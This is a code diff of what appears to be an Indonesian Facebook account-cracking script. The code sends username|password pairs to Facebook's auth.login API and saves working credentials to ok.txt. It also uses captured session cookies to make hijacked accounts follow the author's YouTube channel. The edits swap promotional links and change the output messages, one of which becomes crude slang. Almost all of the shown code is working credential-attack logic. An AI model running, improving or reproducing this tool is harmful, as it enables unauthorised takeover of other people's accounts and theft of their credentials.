@@ -90,14 +90,14 @@ def moch_yayan():
                            except:
                                   pass
                      try:
-                             ikuti = parser(requests.get(mbasic.format("/iDVCcnLcTnE"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ikuti = parser(requests.get(mbasic.format("/https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
                      return cek["cookie"]
-                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
+                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mBerhasil Masuk Tod')
              else:
-                  os.system("xdg-open https://youtu.be/iDVCcnLcTnE") 
+                  os.system("xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookie Error Kentod!!")
                   os.system('python Cr4ck.py')
@@ -118,7 +118,7 @@ def moch_yayan():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
+                 print(f"\r\033[1;92m [->] {username}|{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
@@ -127,7 +127,7 @@ def moch_yayan():
                         with open('ok.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;93m  * --> {username}|{password}                    ",end="")
+                   print(f"\r\033[1;93m [->] {username}|{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
